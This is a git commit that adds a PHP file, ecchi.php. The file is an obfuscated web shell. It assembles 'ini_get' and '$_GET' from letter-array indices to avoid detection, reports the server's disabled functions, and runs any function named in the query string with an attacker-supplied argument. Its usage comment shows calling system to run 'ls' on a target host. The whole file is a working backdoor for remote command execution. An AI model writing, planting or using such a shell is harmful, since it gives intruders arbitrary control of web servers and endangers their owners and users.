2b05df67cf5219bc11d0cb5e36be27d684d20752
Dmz Hari <45622512+dmzhari@users.noreply.github.com>
2022-04-21 07:54:22 +0700

    Create ecchi.php

---
+++ ecchi.php
@@ -0,0 +1,26 @@
+<?php
+/*
+    Usage : http://target.com/ecchi.php?a=system&ecchi=ls
+*/
+
+$upp  = range('A', 'Z');
+$low  = range('a', 'z');
+
+$in   = $low[8] . $low[13] . $low[8];
+$et   = $low[6] . $low[4] . $low[19];
+$init = $in . '_' . $et; // ini_get
+
+$p   = $low[4] . $low[2] . $low[2] . $low[7] . $low[8]; // ecchi
+$g   = "_" . $upp[6] . $upp[4] . $upp[19]; // _GET
+$g   = $$g; // $_GET
+
+$exp = explode(",", $init('disable_functions'));
+if (!isset($g[$low[0]])) {
+    echo "Function Disable : " . $init('disable_functions');
+} else {
+    if (in_array($g[$low[0]], $exp)) {
+        echo "Function Is Disable";
+    } else {
+        call_user_func($g[$low[0]], $g[$p]);
+    }
+}
